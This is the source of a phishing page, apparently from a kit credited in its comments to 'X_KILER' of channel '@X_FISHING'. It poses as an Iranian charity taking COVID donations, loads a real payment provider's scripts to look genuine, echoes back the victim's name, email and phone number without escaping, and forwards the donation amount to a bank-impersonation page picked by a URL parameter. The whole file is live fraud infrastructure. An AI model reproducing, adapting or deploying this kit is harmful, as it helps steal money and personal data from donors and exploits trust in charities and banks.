<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script src="https://idpay.ir/sites/default/files/js/js_EebRuRXFlkaf356V0T2K_8cnUVfCKesNTxdvvPSEhCM.js"></script>
<script src="https://idpay.ir/sites/default/files/js/js_sGA-_IuK68U54f-YOedwglAVlip8XfBcL58am5r1Xwc.js"></script>
<script src="https://idpay.ir/sites/default/files/js/js_0ATqVfblOYRSRhbUxHKArnLEJpivEzfxTW6WZpRh1KE.js"></script>
<script src="https://idpay.ir/sites/default/files/js/js_Xq6fiGTqdj6Iswo46QI-4H5Vou7VY3fL52wwQXP4xn4.js"></script>
	<title>کمک آنلاین خیریه همت</title>

	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
	<script>
		$(function() {
			$("li").click(function(e) {
			  e.preventDefault();
			  $("li").removeClass("selected");
			  $(this).addClass("selected");
			});
		});
	</script>

<style type="text/css">
/************************************** font */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
::placeholder { /* Chrome, Firefox, Opera, Safari 10.1+ */
  color: #32CD32;
  opacity: 1; /* Firefox */
}

:-ms-input-placeholder { /* Internet Explorer 10-11 */
  color: #32CD32;
}

::-ms-input-placeholder { /* Microsoft Edge */
  color: #32CD32;
}
*{
   box-sizing: border-box;
    transition: all .5s ease;
}

body{
  padding: 5% 40%;
  background: #272727;
}

/*Optional container*/
.container{
  width: 100%;
  height: auto;
  position: relative;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
/* Style of input*/ 
.input{
  font-family: sans-serif;
  background: white;
  border-radius: 99px;
  border: 2px solid #cecece;
  padding: 5px 15px;
  color: #525252;
  outline: none;
  font-weight: 500;
  transition: all .5s ease;
  margin-bottom: 10px;
  width: 100%;
  max-width: 100%;
  min-width: 100%;
  height: 37px;
  max-height: 37px;
  min-height: 37px;
  overflow: hidden;
  white-space: nowrap;
  cursor: text;
  box-sizing: border-box;
}

/*Style when is empty*/
.input:empty::after {
    content: attr(placeholder);
    text-transform: capitalize;
    font-size: 0.9rem;
    font-weight: 500;
    color: #b5b4b4;
    transition: all .5s ease;
    left: 0;
    margin: 0;
}
/*Style when have content*/
.input:not(:empty)::after {
    content: attr(placeholder);
    text-transform: capitalize;
    font-size: 0.9rem;
    font-weight: 600;
    color: #5f5f5f;
    position: absolute;
    transition: all .5s ease;
    width: 0;
    margin-top: -32px;
    left: 0;
    color: white;
}
<!--
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
/*
Theme Name: Hemmat
Description: Charitable hemmat
Version: 2.2
Author: Mojdeh Zakerin
Author URI: http://www.mamadnobari.ml
email:mamad.nobari@hotmail.com
*/

/************************************** font */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
@font-face {
	font-family: 'hemmat';
	src: url('font/BMitra.eot');
	src: local('hemmat'),
	local('hemmat'),
	url('font/BMitra.woff') format('woff'),
	url('font/BMitra.ttf') format('truetype'),
	url('font/BMitra.svg#webfonta05IB17H') format('svg');
}

/************************************** body */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
*{
	padding:0px;
	margin:0px;
}
body {
	margin:0px;
	padding:0px;
	direction:rtl;
	background-image: url(images/bg.gif);
	background-repeat: repeat;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
ol,ul,li,abbr{
	list-style:none;
}
.clear{
	clear:both;
}
p{
	text-align:justify;
	line-height:1.5em;
	padding-bottom:5px;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:12px;
}
image,img{
	border:0px;
}
label{
	text-align:right;
	direction:rtl;
}
table{
	width:80%;
	height:auto;
	margin:15px;
	direction:ltr;
}
td{
	padding:10px;
	text-align:right;
	direction:rtl;
}

/************************************** link style */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
body,td,th {
	font-family:Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 12px;
	color:#000000;
	text-align: right;
	direction:rtl;
}
a {
	color:#FF3300;
	text-decoration: none;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
a:link {
	color: #FF3300;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	color: #FF3300;
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
form,input{
	padding:0px;
	margin:0px;
}
h4,h5,h6,form{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 24px;
	font-weight:normal;
	direction:rtl;
	color: #77c14a;
}
h1{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 28px;
	font-weight:normal;
	text-align:center;
	direction:rtl;
	color: #FF3300;
	margin-top:10px;
	/*text-shadow: 0px 1px 1px #000000;*/
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
h2{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 18px;
	font-weight:normal;
	text-align:center;
	direction:rtl;
	color: #000000;
	margin-bottom:10px;
}
h3{
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 30px;
	font-weight:normal;
	text-align:center;
	direction:rtl;
	color: #000000;
}

/************************************** full */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.warp{
	width:100%;
	height:116px;
	position:absolute;
	left:0;
	right:0;
	top:0;
	z-index:-100;
	background-image: url(images/header-top.gif);
	background-repeat: repeat-x;
	background-position: top;
}
.logo{
	width:100%;
	height:238px;
	margin:0 auto 20px;
	background-image:url(images/logo_11808.png);
	background-repeat: no-repeat;
	background-position: center top;
}
.hemmat_{
	width:80%;
	max-width:500px;
	margin:20px auto 0;
}
.note_{
	margin-bottom:10px;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.box{
	width:100%;
	height:auto;
	padding:10px 0px;
	margin:auto;
	
	border:1px solid #000000;

	-webkit-box-shadow: 0px 0px 5px rgba(0, 50, 50, 0.35);
	-moz-box-shadow:    0px 0px 5px rgba(0, 50, 50, 0.35);
	box-shadow:         0px 0px 5px rgba(0, 50, 50, 0.35);

	-webkit-border-radius: 5px;
	-moz-border-radius: 5px;
	border-radius: 5px;
	background-color: #FFFFFF;
}
.box p{
	text-align:right;
	direction:rtl;
	width:80%;
	margin-right:20%;
}
.footer{
	margin-bottom:20px;
	text-align:center;
}

/************************************** bank */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.banks {
	text-align: center;
	list-style: none;
	margin: 10px 0 0;
	padding: 0;
	overflow: hidden;
	position: relative;
}
.banks li {
	display: inline-block;
	position:relative;
	background-color:#FFFFFF;
	padding:3px;
}
.banks li.selected {
	background-color:#FF3300;
}

/************************************** form */
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.n-s{
	width:90%;
	padding-right:5%;
	padding-left:5%;
	margin:auto;
	height:40px;
	background-color:#FFFFFF;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:12px;
	float:left;
	border-bottom-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: dotted;

	border-left-style: none;
	border-bottom-color: #000000;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.n-s-error{
	width:90%;
	padding-right:5%;
	padding-left:5%;
	margin:auto;
	height:40px;
	background-color:#FFB3B5;
	font-family:Tahoma, Arial, Helvetica, sans-serif;
	font-size:12px;
	float:left;
	border-bottom-width: 1px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: dotted;

	border-left-style: none;
	border-bottom-color: #FF0000;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.button {
	margin-top:20px;
    display: inline-block;
    background: #ffc835;
    -webkit-box-shadow: 0px 1px 0px 0px #ffd564 inset, 0px 0px 0px 4px #e6e6e6;
    -moz-box-shadow: 0px 1px 0px 0px #ffd564 inset, 0px 0px 0px 4px #e6e6e6;
    box-shadow: 0px 1px 0px 0px #ffd564 inset, 0px 0px 0px 4px #e6e6e6;
    -webkit-border-radius: 2px;
    -moz-border-radius: 2px;
    border-radius: 2px;
    -webkit-transition: all 0.2s ease-in-out;
    -moz-transition: all 0.2s ease-in-out;
    -o-transition: all 0.2s ease-in-out;
    transition: all 0.2s ease-in-out;
    text-shadow: 0px 1px 0px #ffe6a5;
    padding: 6px 30px;
    border-color: #ebae3e;
    border-width: 1px;
    border-style: solid;
	font-family:"hemmat", BMitra, B Mitra, Tahoma, Geneva, Arial, Helvetica, sans-serif;
	font-size: 26px;
	direction:rtl;
    color: #4f2f2f;
}
/***********Created By: X_KILER *************/
/***********Channel:@X_FISHING *************/
.button:hover {
    background: #ffd200;
    -webkit-box-shadow: 0px 1px 0px 0px #ffe04f inset, 0px 0px 0px 4px #ffed99;
    -moz-box-shadow: 0px 1px 0px 0px #ffe04f inset, 0px 0px 0px 4px #ffed99;
    box-shadow: 0px 1px 0px 0px #ffe04f inset, 0px 0px 0px 4px #ffed99;
    border-color: #ffc835;
}

-->
</style>

</head>
<body>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
	<div class="warp"></div>
	<div class="hemmat_">
	<a href="#"><div class="logo"></div></a>
	<div class="note_">
		<h1>کمک آنلاین به بیماران کرونایی</h1>
	</div>
	<div class="box">
		<center>
				
			<table width="80%" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
			<tbody>
					<tr>
						<td colspan="2" bgcolor="White" style="border-bottom:1px solid #000000;border-top:1px solid #000000;">
							<h3>
							مشاهده تراکنش
							</h3>
						</td>
					</tr>
					<tr>
						<td style="border-bottom:1px solid #000000; border-right:1px solid #000000">
						<?php
if(isset($_POST['name'])) {
$name=$_REQUEST['name'];
echo $name;
}
?>
						</td>
						<td style="border-bottom:1px solid #000000"><span>نام :</span></td>
					</tr>
					<tr>
						<td style="border-bottom:1px solid #000000; border-right:1px solid #000000">
						<?php
if(isset($_POST['lastname'])) {
$lastname=$_REQUEST['lastname'];
echo $lastname;
}
?>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
						</td>
						<td style="border-bottom:1px solid #000000"><span>نام خانوادگی :</span></td>
					</tr>
					<tr>
						<td style="border-bottom:1px solid #000000; border-right:1px solid #000000"> 
						<?php
if(isset($_POST['email'])) {
$email=$_REQUEST['email'];
echo $email;
}
?>
						</td>
						<td style="border-bottom:1px solid #000000"><span> پست الکترونیکی :</span></td>
					</tr>
					<tr>
						<td style="border-bottom:1px solid #000000; border-right:1px solid #000000">
						<?php
if(isset($_POST['mobile'])) {
$mobile=$_REQUEST['mobile'];
echo $mobile;
}
?>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
</span>
						</td>
						<td style="border-bottom:1px solid #000000"><span>شماره تلفن همراه :</span></td>
					</tr>
					<tr>
						<td style="border-bottom:1px solid #000000; border-right:1px solid #000000">
						<?php
if(isset($_POST['PayAdditionalData'])) {
$PayAdditionalData=$_REQUEST['PayAdditionalData'];
echo $PayAdditionalData;
}
?>
						</td>
						<td style="border-bottom:1px solid #000000"><span>توضیحات : </span></td>
					</tr>
					<tr>
							<td  colspan="2" bgcolor="White" style="text-align: center;border-bottom:1px solid #000000;border-top:1px solid #000000;">
							
							
							<form action="../<?php echo $P?>/?e=<?php echo $e?>&" method="post" id="idpay-process-block-form" accept-charset="UTF-8">
							<div>
							<div class="form-item form-type-textfield form-item-amount">
							<label for="edit-amount"><h1>مبلغ اهدایی را در کادر زیر وارد نمایید.</h1></label>
							<input class="input" contenteditable="" placeholder="مبلغ به (ریال)" required="required"autocomplete="off" data-type="number" data-price="" type="text" id="edit-amount" name="amount" value="" size="11" maxlength="11" class="form-text required" />
							<span class="field-suffix"></span><div class="description">مبلغ به تومان</div>
							</div>
							<div class="form-item form-type-textfield form-item-name">
							<input  class="button" type="submit"  value="پرداخت" />
						</td>
					</tr>
			</tbody>
		  </table>
		</center>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
	</div>	
	<div class="clear"></div>
	<br />
	<div align="center">
		 کمک آنلاین به بیماران کرونایی|
		<a href="#">خیریه همت</a>
	 </div>
	</div>

</body>
</html>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
<html>  
<head>
    <style>img[alt="www.000webhost.com"]{display:none;}</style>
  <meta charset="utf-8">
  <title></title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
